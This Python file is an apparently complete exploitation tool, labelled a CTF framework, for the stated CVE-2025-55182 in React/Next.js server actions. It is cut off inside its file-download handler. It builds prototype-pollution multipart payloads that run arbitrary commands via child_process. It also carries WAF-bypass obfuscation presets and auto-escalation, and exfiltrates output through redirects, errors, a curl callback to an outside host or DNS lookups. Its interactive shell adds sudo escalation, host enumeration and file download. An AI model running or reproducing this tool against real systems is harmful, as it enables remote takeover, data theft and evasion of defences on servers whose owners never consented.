#!/usr/bin/env python3
"""
React2Shell Advanced v2 — CVE-2025-55182 CTF Framework
Deep research-based implementation with dual payload strategies,
safe probing, WAF bypass, multi-channel exfil, and auto-escalation.
"""
import sys,os,re,time,random,string,base64,json,readline,socket
from datetime import datetime
from urllib.parse import urlparse,unquote,quote
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("pip install requests");sys.exit(1)

R='\033[91m';G='\033[92m';Y='\033[93m';B='\033[94m';M='\033[95m';C='\033[96m';W='\033[0m';BOLD='\033[1m';DIM='\033[2m'
UA_POOL=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.2 Safari/605.1.15",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"]
DEBUG=False
def dbg(m):
    if DEBUG:print(f"{DIM}  [DBG] {m}{W}")
def ue(s):
    return ''.join(f'\\u{ord(c):04x}' for c in s)

def resolve_domain(ip):
    """Try reverse DNS + forward lookups to find domain for an IP."""
    domains=[]
    try:
        host,_,_=socket.gethostbyaddr(ip)
        if host and host!=ip:domains.append(host)
    except:pass
    try:
        results=socket.getaddrinfo(ip,None)
        for r in results:
            if r[3] and r[3] not in domains and r[3]!=ip:domains.append(r[3])
    except:pass
    return domains

def is_ip(host):
    """Check if string is an IP address."""
    try:socket.inet_aton(host);return True
    except:pass
    try:socket.inet_pton(socket.AF_INET6,host);return True
    except:return False


# ═══════════════════════════════════════════════════════════
# MULTIPART BUILDER
# ═══════════════════════════════════════════════════════════
class MultipartBuilder:
    """Build RFC 2046 multipart bodies with WAF bypass tricks."""
    def __init__(self,bypass=None):
        self.bp=bypass or {}
    def build(self,parts_dict):
        """parts_dict: {name: value_string}. Returns (body_bytes, content_type)."""
        bp=self.bp
        bnd=self._boundary(bp.get('obf_boundary',False))
        le="\r\r\n" if bp.get('extra_cr') else ("\n" if bp.get('lf_only') else "\r\n")
        cd=''.join(c.upper() if random.choice([0,1]) else c.lower() for c in "Content-Disposition") if bp.get('rand_case') else "Content-Disposition"
        q="'" if bp.get('single_quotes') else '"'
        sp="\t" if bp.get('tab_ws') else " "
        segs=[]
        # Empty first part
        if bp.get('empty_part'):
            segs.append(f"--{bnd}{le}Content-Disposition: form-data; name=\"__x__{le}{le}{le}")
        # Junk padding
        jkb=bp.get('junk_kb',0)
        if jkb>0:
            n=''.join(random.choices(string.ascii_lowercase,k=10))
            d=''.join(random.choices(string.ascii_letters+string.digits,k=jkb*1024))
            segs.append(f"--{bnd}{le}{cd}:{sp}form-data;{sp}name={q}{n}{q}{le}{le}{d}{le}")
        # Parameter pollution
        if bp.get('pollution'):
            for _ in range(random.randint(2,4)):
                n=random.choice(['action','submit','type','ref'])+str(random.randint(100,999))
                v=''.join(random.choices(string.ascii_letters,k=random.randint(8,20)))
                segs.append(f"--{bnd}{le}{cd}:{sp}form-data;{sp}name={q}{n}{q}{le}{le}{v}{le}")
        # Actual parts
        for name,val in parts_dict.items():
            disp=f"{cd}:{sp}form-data;{sp}name={q}{name}{q}"
            if bp.get('dup_name'):
                disp+=f";{sp}name={q}{''.join(random.choices(string.ascii_lowercase,k=5))}{q}"
            if bp.get('line_fold'):
                disp=disp.replace(f";{sp}name",f";{le} name",1)
            segs.append(f"--{bnd}{le}{disp}{le}{le}{val}{le}")
        if not bp.get('missing_boundary'):
            segs.append(f"--{bnd}--")
        body="".join(segs).encode('utf-8')
        # Content-Type
        bparam=f"boundary={bnd}"
        if bp.get('boundary_semi'):bparam+=";"
        if bp.get('boundary_pad'):bparam=f"boundary= {bnd} "
        ct=f"multipart/form-data; {bparam}"
        cs=bp.get('charset')
        CHARSETS={'utf16le':'utf-16le','utf16be':'utf-16be','utf7':'utf-7','utf32':'utf-32','ibm037':'ibm037'}
        if cs=='double':ct+="; charset=utf-8; charset=utf-7"
        elif cs and cs in CHARSETS:ct+=f"; charset={CHARSETS[cs]}"
        return body,ct

    def _boundary(self,obf):
        if obf:return ''.join(random.choices(string.ascii_letters+string.digits,k=32))
        return "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"


# ═══════════════════════════════════════════════════════════
# PAYLOAD STRATEGIES
# ═══════════════════════════════════════════════════════════
class PayloadStrategy:
    """Generate exploit payloads in different structural variants."""

    @staticmethod
    def js_rce(cmd,exfil='redirect',obf_level=0,**kw):
        """Build the JS code that goes into _prefix."""
        ce=cmd.replace("\\","\\\\").replace("'","\\'").replace('"','\\"')
        # Build require chain based on obfuscation
        if obf_level==0:
            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}})"
        elif obf_level<=2:
            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000}})"
        else:
            # eval(Buffer.from(b64)) — hides ALL JS from WAF
            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}})"
            inner_full=PayloadStrategy._exfil_wrap(inner,exfil,**kw)
            b=base64.b64encode(inner_full.encode()).decode()
            return f"eval(Buffer.from('{b}','base64').toString())//"
        return PayloadStrategy._exfil_wrap(rce,exfil,**kw)

    @staticmethod
    def js_rce_truncated(cmd,max_bytes=4000,exfil='redirect',obf_level=0,**kw):
        """Like js_rce but truncates output server-side for large commands."""
        ce=cmd.replace("\\","\\\\").replace("'","\\'").replace('"','\\"')
        if obf_level==0:
            rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}}).toString().substring(0,{max_bytes})"
        elif obf_level<=2:
            rce=f"process['main'+'Module']['req'+'uire']('child_'+'process')['exec'+'Sync']('{ce}',{{timeout:8000}}).toString().substring(0,{max_bytes})"
        else:
            inner=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000}}).toString().substring(0,{max_bytes})"
            inner_full=PayloadStrategy._exfil_wrap_str(inner,exfil,**kw)
            b=base64.b64encode(inner_full.encode()).decode()
            return f"eval(Buffer.from('{b}','base64').toString())//"
        return PayloadStrategy._exfil_wrap_str(rce,exfil,**kw)

    @staticmethod
    def _exfil_wrap_str(rce_str_expr,exfil,**kw):
        """Like _exfil_wrap but rce_str_expr already returns a string, not Buffer."""
        if exfil=='redirect':
            return (f"var r=Buffer.from({rce_str_expr}).toString('base64');"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/login?a='+r+';307;'}});")
        elif exfil=='redirect_plain':
            return (f"var r={rce_str_expr};"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/pwned?output='+encodeURIComponent(r)+';307;'}});")
        elif exfil=='error':
            return (f"var r=Buffer.from({rce_str_expr}).toString('base64');"
                    f"throw new Error('R2S'+r+'END');")
        return PayloadStrategy._exfil_wrap_str(rce_str_expr,'redirect',**kw)

    @staticmethod
    def _exfil_wrap(rce_expr,exfil,**kw):
        if exfil=='redirect':
            return (f"var r={rce_expr}.toString('base64');"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/login?a='+r+';307;'}});")
        elif exfil=='redirect_plain':
            return (f"var r={rce_expr}.toString().trim();"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/pwned?output='+r+';307;'}});")
        elif exfil=='error':
            return (f"var r={rce_expr}.toString('base64');"
                    f"throw new Error('R2S'+r+'END');")
        elif exfil=='callback':
            cb=kw.get('callback_url','http://127.0.0.1:8080')
            return (f"var r={rce_expr}.toString('base64');"
                    f"process.mainModule.require('child_process').execSync("
                    f"'curl -s -d \"'+r+'\" \"{cb}\"',{{timeout:5000}});"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/ok;307;'}});")
        elif exfil=='dns':
            dom=kw.get('dns_domain','x.example.com')
            return (f"var r={rce_expr}.toString('hex').substring(0,60);"
                    f"process.mainModule.require('child_process').execSync("
                    f"'nslookup '+r+'.{dom}',{{timeout:5000}});"
                    f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:'NEXT_REDIRECT;push;/ok;307;'}});")
        return PayloadStrategy._exfil_wrap(rce_expr,'redirect',**kw)

    @staticmethod
    def strategy_A(js_code,json_esc=0):
        """Circulating 3-part PoC: $@0 self-ref + $1:__proto__:then"""
        proto="__proto__"
        constr="constructor"
        if json_esc>=2:
            proto=ue("__proto__")
            constr=ue("constructor")
        elif json_esc>=1:
            proto=ue("__proto__")
        p0=(f'{{"then":"$1:{proto}:then","status":"resolved_model","reason":-1,'
            f'"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":"{js_code}",'
            f'"_chunks":"$Q2","_formData":{{"get":"$1:{constr}:{constr}"}}}}}}')
        return {"0":p0,"1":'"$@0"',"2":"[]"}

    @staticmethod
    def strategy_B(js_code,json_esc=0):
        """lachlan2k Original 5-part: $@3 + $2:then + map chaining"""
        constr="constructor"
        if json_esc>=1:constr=ue("constructor")
        p0='"$1"'
        p1=json.dumps({
            "status":"resolved_model","reason":0,"_response":"$4",
            "value":json.dumps({"then":"$3:map","0":{"then":"$B3"},"length":1}),
            "then":"$2:then"
        })
        p2='"$@3"'
        p3="[]"
        p4_obj={"_prefix":js_code,"_formData":{"get":f"$3:{constr}:{constr}"},"_chunks":"$2:_response:_chunks"}
        p4=json.dumps(p4_obj)
        if json_esc>=1:
            p4=p4.replace("_prefix",ue("_prefix")).replace("_formData",ue("_formData")).replace("_chunks",ue("_chunks"))
            p1=p1.replace("_response",ue("_response"))
        return {"0":p0,"1":p1,"2":p2,"3":p3,"4":p4}

    @staticmethod
    def safe_probe():
        """Detection probe — triggers 500 + E{"digest" without RCE."""
        return {"0":'["$1:aa:aa"]',"1":"{}"}


# ═══════════════════════════════════════════════════════════
# OUTPUT EXTRACTOR
# ═══════════════════════════════════════════════════════════
class OutputExtractor:
    @staticmethod
    def extract(resp):
        t=resp.text or "";h=resp.headers
        # Redirect headers
        for hn in ['X-Action-Redirect','Location','x-action-redirect']:
            v=h.get(hn,'')
            if not v:continue
            m=re.search(r'[?&]a=([A-Za-z0-9+/=%-]+)',v)
            if m:
                try:
                    d=base64.b64decode(unquote(m.group(1))).decode('utf-8',errors='ignore').strip()
                    if d:return d,f'hdr:{hn}'
                except:pass
            m=re.search(r'output=([^;]+)',v)
            if m:
                d=unquote(m.group(1)).strip()
                if d:return d,f'hdr:{hn}:output'
        # R2S markers in body
        m=re.search(r'R2S(.+?)END',t,re.DOTALL)
        if m:
            raw=m.group(1).strip()
            try:
                d=base64.b64decode(raw).decode('utf-8',errors='ignore').strip()
                if d:return d,'body:r2s'
            except:
                if raw:return raw,'body:r2s_raw'
        # NEXT_REDIRECT digest in body
        for p in [r'NEXT_REDIRECT;push;/login\?a=([A-Za-z0-9+/=%-]+)',
                  r'NEXT_REDIRECT;push;/pwned\?output=([^;]+)',
                  r'[?&]a=([A-Za-z0-9+/=]{8,})']:
            m=re.search(p,t)
            if m:
                try:
                    d=base64.b64decode(unquote(m.group(1))).decode('utf-8',errors='ignore').strip()
                    if d:return d,'body:digest'
                except:
                    d=unquote(m.group(1)).strip()
                    if d and len(d)>1:return d,'body:digest_raw'
        return None,None

    @staticmethod
    def dump(resp):
        lines=[f"  HTTP {resp.status_code} {resp.reason}"]
        for k,v in resp.headers.items():lines.append(f"  {k}: {v}")
        b=resp.text or "(empty)"
        lines.append(f"  Body[{len(b)}b]: {b[:2000]}")
        return '\n'.join(lines)


# ═══════════════════════════════════════════════════════════
# WAF FINGERPRINTER
# ═══════════════════════════════════════════════════════════
PRESETS={
    'none':{},
    'light':{'obf_boundary':True,'empty_part':True},
    'medium':{'junk_kb':32,'obf_boundary':True,'rand_case':True,'empty_part':True},
    'generic':{'junk_kb':64,'obf_boundary':True,'rand_case':True,'pollution':True,'empty_part':True},
    'heavy':{'junk_kb':128,'charset':'utf16le','obf_boundary':True,'rand_case':True,'pollution':True,'empty_part':True,'dup_name':True},
    'aggressive':{'junk_kb':256,'charset':'utf32','obf_boundary':True,'rand_case':True,'pollution':True,'empty_part':True,'dup_name':True,'tab_ws':True,'line_fold':True,'extra_cr':True,'single_quotes':True},
}
WAF_SIGS={'cloudflare':['cf-ray','cloudflare'],'akamai':['akamai'],'aws_waf':['x-amzn','awselb'],'modsecurity':['mod_security'],'imperva':['x-iinfo','incap_ses'],'sucuri':['x-sucuri']}

def fingerprint_waf(session,url):
    try:
        r=session.get(url,timeout=20,verify=False)
        combined=' '.join(f"{k}:{v}" for k,v in r.headers.items()).lower()
        combined+=' '.join(f"{k}={v}" for k,v in r.cookies.items()).lower()
        for waf,sigs in WAF_SIGS.items():
            if any(s in combined for s in sigs):return waf
    except:pass
    return None


# ═══════════════════════════════════════════════════════════
# ADVANCED SHELL
# ═══════════════════════════════════════════════════════════
class AdvancedShell:
    EXFIL_CHS=['redirect','redirect_plain','error','callback','dns']

    # Auto-escalation matrix: (strategy, json_esc, obf_level, bypass_key, exfil)
    ESCALATION=[
        # Start simple — no bypass, just different strategies
        ('A',0,0,'none','redirect'),('B',0,0,'none','redirect'),
        ('A',0,0,'none','redirect_plain'),('B',0,0,'none','redirect_plain'),
        ('A',0,0,'none','error'),('B',0,0,'none','error'),
        # Add Unicode JSON escaping
        ('A',1,0,'none','redirect'),('A',2,0,'none','redirect'),
        ('A',1,0,'none','error'),('A',2,0,'none','error'),
        ('B',1,0,'none','redirect'),('B',1,0,'none','error'),
        # Add JS obfuscation (eval wrapper)
        ('A',0,3,'none','redirect'),('A',1,3,'none','redirect'),
        ('A',2,3,'none','redirect'),('A',2,3,'none','error'),
        ('B',0,3,'none','redirect'),('B',1,3,'none','error'),
        # Add light multipart bypass
        ('A',2,3,'light','redirect'),('A',2,3,'light','error'),
        ('B',1,3,'light','redirect'),('B',1,3,'light','error'),
        # Medium bypass
        ('A',2,3,'medium','redirect'),('A',2,3,'medium','error'),
        # Generic bypass
        ('A',2,3,'generic','redirect'),('A',2,3,'generic','error'),
        # Heavy bypass
        ('A',2,4,'heavy','redirect'),('A',2,4,'heavy','error'),
        # Aggressive
        ('A',2,4,'aggressive','redirect'),('A',2,4,'aggressive','error'),
    ]

    def __init__(self,target,args):
        self.target=target.rstrip('/')
        self.args=args
        self.session=requests.Session()
        self.session.verify=False
        self.timeout=getattr(args,'timeout',90)
        self.current_dir=None
        self.root_mode=False
        self.obf_level=getattr(args,'obfuscate',0)
        self.json_esc=getattr(args,'json_escape',0)
        self.exfil_ch=getattr(args,'exfil','redirect')
        self.strategy=getattr(args,'strategy','A')
        self.stealth=getattr(args,'stealth',False)
        self.callback_url=getattr(args,'callback_url',None)
        self.dns_domain=getattr(args,'dns_domain',None)
        self.bypass_cfg=PRESETS.get(getattr(args,'bypass','none'),{}).copy()
        self.host_header=getattr(args,'host',None)
        self.waf_name=None
        self.last_output=""
        self.target_os=None  # 'windows' or 'linux', auto-detected
        self.truncate=False  # off by default — opt-in via .truncate
        self.hist=os.path.expanduser("~/.r2s_history")
        if getattr(args,'proxy',None):
            self.session.proxies={'http':args.proxy,'https':args.proxy}
        try:readline.read_history_file(self.hist)
        except:pass
        readline.set_history_length(1000)

    def _headers(self):
        h={"User-Agent":random.choice(UA_POOL) if self.stealth else UA_POOL[0],
           "Next-Action":''.join(random.choices(string.hexdigits[:16],k=8)),
           "Accept":"text/x-component, */*","Accept-Language":"en-US,en;q=0.9"}
        if self.host_header:h["Host"]=self.host_header
        if self.stealth:h.update({"Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"})
        return h

    def _send(self,parts_dict,bypass=None,timeout=None):
        """Send multipart payload. Returns (response, error_string)."""
        bp=bypass if bypass is not None else self.bypass_cfg
        tout=timeout or self.timeout
        mb=MultipartBuilder(bp)
        body,ct=mb.build(parts_dict)
        headers=self._headers()
        headers["Content-Type"]=ct
        if self.stealth:time.sleep(random.uniform(0.3,1.5))
        dbg(f"Sending {len(body)}b, ct={ct[:80]}")
        t0=time.time()
        try:
            r=self.session.post(self.target,headers=headers,data=body,timeout=tout,allow_redirects=False)
            dbg(f"HTTP {r.status_code} in {time.time()-t0:.1f}s ({len(r.text or '')}b)")
            return r,None
        except requests.exceptions.Timeout:return None,f"Timeout ({time.time()-t0:.0f}s)"
        except requests.exceptions.ConnectionError as e:return None,f"ConnErr: {e}"
        except Exception as e:return None,str(e)

    def _exploit(self,cmd,strategy=None,json_esc=None,obf=None,exfil=None,bypass=None,timeout=None):
        """Build exploit payload + send + extract output. Returns (output, resp, err)."""
        strat=strategy or self.strategy
        je=json_esc if json_esc is not None else self.json_esc
        ol=obf if obf is not None else self.obf_level
        ch=exfil or self.exfil_ch
        final=cmd
        # Keep same proven wrapping for ALL platforms — it works on Windows cmd.exe too
        if self.current_dir:
            if self.target_os=='windows':
                final=f'cd /d {self.current_dir} & {cmd}'
            else:
                final=f"cd {self.current_dir} && {cmd}"
        if self.root_mode and self.target_os!='windows':
            b=base64.b64encode(final.encode()).decode()
            final=f'echo {b}|base64 -d|sudo -i 2>&1||true'
        else:
            final=f"({final}) 2>&1||true"
        kw={}
        if ch=='callback' and self.callback_url:kw['callback_url']=self.callback_url
        if ch=='dns' and self.dns_domain:kw['dns_domain']=self.dns_domain
        # Use truncated version by default to avoid header overflow
        if self.truncate:
            js=PayloadStrategy.js_rce_truncated(final,4000,ch,ol,**kw)
        else:
            js=PayloadStrategy.js_rce(final,ch,ol,**kw)
        if strat=='B':parts=PayloadStrategy.strategy_B(js,je)
        else:parts=PayloadStrategy.strategy_A(js,je)
        resp,err=self._send(parts,bypass=bypass,timeout=timeout)
        if err:return None,None,err
        out,method=OutputExtractor.extract(resp)
        if out:dbg(f"Extracted via {method}")
        return out,resp,None

    def execute(self,cmd):
        out,resp,err=self._exploit(cmd)
        if out:
            # Auto-detect OS from first successful output
            if self.target_os is None:
                low=out.lower()
                if any(w in low for w in ['volume in drive','windows','\\users\\','c:\\','iis']):
                    self.target_os='windows'
                    dbg('Detected Windows target')
                elif any(w in low for w in ['/bin/','/usr/','/home/','linux','ubuntu','root:']):
                    self.target_os='linux'
                    dbg('Detected Linux target')
            return out
        if err:return f"{R}[-] {err}{W}"
        if resp:return f"{Y}[!] No output (HTTP {resp.status_code}). Output may be too large — try piping: cmd | more{W}"
        return f"{R}[-] No response{W}"

    def safe_probe(self):
        """Non-RCE probe to confirm vulnerability."""
        print(f"{Y}[*] Safe probe (no RCE) — looking for E{{\"digest\" in HTTP 500...{W}")
        parts=PayloadStrategy.safe_probe()
        # Try with no bypass first
        for label,bp in [("vanilla",{}),("obf-boundary",{'obf_boundary':True}),("light",PRESETS['light']),("medium",PRESETS['medium'])]:
            sys.stdout.write(f"  [{label}] ");sys.stdout.flush()
            resp,err=self._send(parts,bypass=bp,timeout=min(45,self.timeout))
            if err:print(f"{R}✗ {err}{W}");continue
            if resp:
                is_vuln=resp.status_code==500 and 'E{"digest"' in (resp.text or '')
                if is_vuln:
                    print(f"{G}✓ VULNERABLE! (HTTP {resp.status_code}, digest in body){W}")
                    return True
                # Even a non-500 response means WAF isn't dropping the connection
                print(f"{Y}⚠ HTTP {resp.status_code} (body: {(resp.text or '')[:100]}){W}")
            else:print(f"{R}✗ no response{W}")
        print(f"\n{Y}  Probe didn't confirm vulnerability. The WAF may be blocking even probe requests.{W}")
        return False

    def raw_test(self,cmd="echo TESTPING"):
        """Send ONE exploit and show full raw response."""
        print(f"{Y}[*] RAW TEST: '{cmd}' strategy={self.strategy} json_esc={self.json_esc} obf=L{self.obf_level} exfil={self.exfil_ch}{W}")
        print(f"    bypass={self.bypass_cfg}  timeout={self.timeout}s{W}")
        t0=time.time()
        out,resp,err=self._exploit(cmd)
        dt=time.time()-t0
        if err:
            print(f"\n{R}  RESULT: {err} (after {dt:.1f}s){W}")
            print(f"{Y}  Server didn't respond. WAF likely dropping connection.{W}")
            print(f"{Y}  Try: .strategy B  or  .jsonesc 2  or  .obf 3{W}")
            return
        if resp:
            print(f"\n{C}═══ RAW RESPONSE ({dt:.1f}s) ═══{W}")
            print(OutputExtractor.dump(resp))
            print(f"{C}══════════════════════════{W}")
        if out:print(f"\n{G}[+] EXTRACTED: {out}{W}")
        else:print(f"\n{Y}[!] Response received but no output extracted.{W}")

    def auto_exploit(self,command):
        total=len(self.ESCALATION)
        print(f"{Y}[*] Auto-escalating through {total} combinations...{W}")
        for i,(strat,je,ol,bpk,ch) in enumerate(self.ESCALATION):
            bp=PRESETS.get(bpk,{})
            label=f"{i+1}/{total} S{strat} je{je} o{ol} {bpk} {ch}"
            sys.stdout.write(f"\r  {Y}[{label}]{W}"+" "*20);sys.stdout.flush()
            out,resp,err=self._exploit(command,strategy=strat,json_esc=je,obf=ol,exfil=ch,bypass=bp,timeout=min(60,self.timeout))
            if out:
                print(f"\r  {G}[✓ {label}] SUCCESS!{W}"+" "*20)
                self.strategy=strat;self.json_esc=je;self.obf_level=ol;self.exfil_ch=ch;self.bypass_cfg=bp.copy()
                print(f"{G}  Locked config{W}")
                return out
            if resp:dbg(f"HTTP {resp.status_code}")
        print(f"\r{R}[-] All {total} combos failed.{W}"+" "*30)
        print(f"{Y}  Try: .rawtest id  |  .safeprobe  |  --exfil callback --callback-url URL{W}")
        return None

    def banner(self):
        print(f"""
{BOLD}{C}╔══════════════════════════════════════════════════════════════╗
║  {G}React2Shell Advanced v2{C} — CTF Exploitation Framework        ║
║  {Y}CVE-2025-55182{C} | Dual Payload | WAF Bypass | Multi-Exfil    ║
╚══════════════════════════════════════════════════════════════╝{W}
  {Y}Target:{W}    {self.target}{f'  {Y}Host:{W} {self.host_header}' if self.host_header else ''}
  {Y}Strategy:{W}  {self.strategy}  {Y}Exfil:{W} {self.exfil_ch}  {Y}Obf:{W} L{self.obf_level}  {Y}JSON-Esc:{W} {self.json_esc}
  {Y}Timeout:{W}   {self.timeout}s  {Y}Debug:{W} {'ON' if DEBUG else 'OFF'}

{BOLD}Commands:{W}
  {G}.safeprobe{W}        Non-RCE vuln check    {G}.rawtest{W} [cmd]    Raw response debug
  {G}.auto{W} [cmd]       Auto-escalate         {G}.waf{W}              Fingerprint WAF
  {G}.strategy{W} A|B     Payload variant        {G}.exfil{W} [ch]      Switch exfil
  {G}.obf{W} N            JS obfuscation 0-4     {G}.jsonesc{W} N       JSON escape 0-2
  {G}.bypass{W} [preset]  WAF bypass preset      {G}.debug{W}            Toggle debug
  {G}.timeout{W} N        Set timeout            {G}.status{W}           Show config
  {G}.host{W} domain      Set Host header        {G}.info{W}             System enum
  {G}.download{W} path    Download file          {G}.root{W}             Toggle sudo
  {G}.save{W}             Save output            {G}.exit{W}             Exit
""")

    def try_resolve_domain(self):
        """If target is IP, try reverse DNS and offer domain."""
        parsed=urlparse(self.target)
        host=parsed.hostname or ''
        if not is_ip(host):return
        print(f"{Y}[*] Target is an IP ({host}). Resolving domain...{W}")
        domains=resolve_domain(host)
        if domains:
            print(f"{G}[+] Found domain(s): {', '.join(domains)}{W}")
            for d in domains:
                ans=input(f"  Use {C}{d}{W} as Host header? [Y/n] ").strip().lower()
                if ans in ['','y','yes']:
                    self.host_header=d
                    print(f"{G}  Host header set to: {d}{W}")
                    return
            ans=input(f"  Enter domain manually (or press Enter to skip): ").strip()
            if ans:self.host_header=ans;print(f"{G}  Host header set to: {ans}{W}")
        else:
            print(f"{Y}  No domain found via reverse DNS.{W}")
            ans=input(f"  Enter domain manually (or press Enter to skip): ").strip()
            if ans:self.host_header=ans;print(f"{G}  Host header set to: {ans}{W}")

    def run(self):
        self.banner()
        # Auto-resolve domain if target is IP
        if not self.host_header:
            self.try_resolve_domain()
        if getattr(self.args,'bypass',None)=='auto':
            print(f"{Y}[*] Fingerprinting WAF...{W}")
            w=fingerprint_waf(self.session,self.target)
            if w:self.waf_name=w;print(f"{G}[+] Detected: {w}{W}")
            else:print(f"{Y}[*] No known WAF signature{W}")
        # Try both pwd (Linux) and cd (Windows) for init
        print(f"{Y}[*] Connecting...{W}")
        out,resp,err=self._exploit("pwd",timeout=min(50,self.timeout))
        if out and '/' in out and len(out)<200:
            self.current_dir=out.strip().split('\n')[0]
            self.target_os='linux'
            print(f"{G}[+] Connected! OS: Linux  CWD: {self.current_dir}{W}")
        elif out:
            # Got output but not a unix path — try Windows
            self.target_os='windows'
            print(f"{G}[+] Connected! OS: Windows{W}")
        else:
            # pwd failed, try Windows 'cd'
            out2,resp2,err2=self._exploit("cd",timeout=min(50,self.timeout))
            if out2 and ('\\' in out2 or ':' in out2):
                self.target_os='windows'
                self.current_dir=out2.strip().split('\n')[0]
                print(f"{G}[+] Connected! OS: Windows  CWD: {self.current_dir}{W}")
            elif resp or resp2:
                print(f"{Y}[!] Got HTTP response but no output. Try .rawtest or .auto{W}")
            elif err:
                print(f"{Y}[!] {err}. Try .safeprobe or set domain with .host{W}")
        try:
            while True:
                try:
                    pu=f"{BOLD}{R}root{W}" if self.root_mode else f"{BOLD}{G}user{W}"
                    pd=f"{BOLD}{B}{self.current_dir or '~'}{W}"
                    ps=f"{DIM}[S{self.strategy}|{self.exfil_ch}|L{self.obf_level}]{W}"
                    cmd=input(f"{pu}@{BOLD}{C}target{W}:{pd}{ps}$ ").strip()
                    if not cmd:continue
                    if cmd=='.exit':break
                    elif cmd=='.help':self.banner()
                    elif cmd=='.safeprobe':self.safe_probe()
                    elif cmd=='.debug':
                        global DEBUG;DEBUG=not DEBUG;print(f"{Y}Debug {'ON' if DEBUG else 'OFF'}{W}")
                    elif cmd=='.waf':
                        w=fingerprint_waf(self.session,self.target)
                        print(f"{G}Detected: {w}{W}" if w else f"{Y}No WAF signature{W}")
                    elif cmd=='.root':self.root_mode=not self.root_mode;print(f"{Y}Root {'ON' if self.root_mode else 'OFF'}{W}")
                    elif cmd=='.stealth':self.stealth=not self.stealth;print(f"{Y}Stealth {'ON' if self.stealth else 'OFF'}{W}")
                    elif cmd.startswith('.host'):
                        p=cmd.split()
                        if len(p)>1:self.host_header=p[1];print(f"{G}Host header: {self.host_header}{W}")
                        else:print(f"  Current: {self.host_header or '(auto)'}\n  Usage: .host target-domain.com")
                    elif cmd=='.status':
                        print(f"  strategy={self.strategy} exfil={self.exfil_ch} obf=L{self.obf_level} json_esc={self.json_esc}")
                        print(f"  bypass={self.bypass_cfg}\n  timeout={self.timeout}s root={self.root_mode}")
                    elif cmd=='.save':
                        if self.last_output:
                            fn=f"out_{datetime.now().strftime('%H%M%S')}.txt"
                            open(fn,'w').write(self.last_output);print(f"{G}Saved: {fn}{W}")
                    elif cmd.startswith('.timeout'):
                        p=cmd.split();self.timeout=max(10,int(p[1])) if len(p)>1 else self.timeout;print(f"Timeout: {self.timeout}s")
                    elif cmd.startswith('.strategy'):
                        p=cmd.split()
                        if len(p)>1 and p[1] in ['A','B']:self.strategy=p[1];print(f"{G}Strategy: {self.strategy}{W}")
                        else:print("  A = Circulating 3-part ($@0, __proto__:then)\n  B = Original 5-part ($@3, $2:then, map chain)")
                    elif cmd.startswith('.exfil'):
                        p=cmd.split()
                        if len(p)>1 and p[1] in self.EXFIL_CHS:self.exfil_ch=p[1];print(f"{G}Exfil: {self.exfil_ch}{W}")
                        else:print(f"  Available: {', '.join(self.EXFIL_CHS)}")
                    elif cmd.startswith('.bypass'):
                        p=cmd.split()
                        if len(p)>1 and p[1] in PRESETS:self.bypass_cfg=PRESETS[p[1]].copy();print(f"{G}Bypass: {p[1]}{W}")
                        else:print(f"  Available: {', '.join(PRESETS.keys())}")
                    elif cmd.startswith('.obf'):
                        p=cmd.split();self.obf_level=max(0,min(4,int(p[1]))) if len(p)>1 else self.obf_level;print(f"Obf: L{self.obf_level}")
                    elif cmd.startswith('.jsonesc'):
                        p=cmd.split();self.json_esc=max(0,min(2,int(p[1]))) if len(p)>1 else self.json_esc;print(f"JSON-esc: {self.json_esc}")
                    elif cmd.startswith('.auto'):
                        p=cmd.split(None,1);c=p[1] if len(p)>1 else "id"
                        out=self.auto_exploit(c)
                        if out:self.last_output=out;print(out)
                    elif cmd.startswith('.rawtest'):
                        p=cmd.split(None,1);self.raw_test(p[1] if len(p)>1 else "echo TESTPING")
                    elif cmd.startswith('.info'):
                        print(f"{Y}[*] Enumerating...{W}")
                        if self.target_os=='windows':
                            cmds=[("User","whoami"),("Host","hostname"),("OS","ver"),("IP","ipconfig | findstr IPv4"),("CWD","cd"),("Privs","whoami /priv | findstr Enabled"),("AV","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName 2>nul || echo N/A")]
                        else:
                            cmds=[("OS","uname -a"),("User","whoami"),("ID","id"),("Host","hostname"),("CWD","pwd"),("Distro","cat /etc/os-release 2>/dev/null | head -2 || echo N/A")]
                        for l,c in cmds:
                            o=self.execute(c)
                            if o and '[-]' not in o and '[!' not in o:
                                # Clean up the cd/d error for Windows
                                lines=[x for x in o.strip().split('\n') if 'cannot find the path' not in x.lower()]
                                clean='\n'.join(lines).strip()
                                if clean:print(f"  {C}{l}:{W} {clean}")
                                else:print(f"  {C}{l}:{W} {R}failed{W}")
                            else:print(f"  {C}{l}:{W} {R}failed{W}")
                    elif cmd.startswith('.download') or cmd.startswith('.dl'):
                        p=cmd.split()
                        if len(p)<2:print("Usage: .download <remote> [local]");continue
                        rp=p[1];lp=p[2] if len(p)>2 else f"dl_{os.path.basename(rp)}"
                        os.makedirs(os.path.dirname(os.path.abspath(lp)) or '.',exist_ok=True)
                        if self.target_os=='windows':
                            o=self.execute(f'certutil -encodehex "{rp}" CON 0x40000001 2>nul')
                        else:
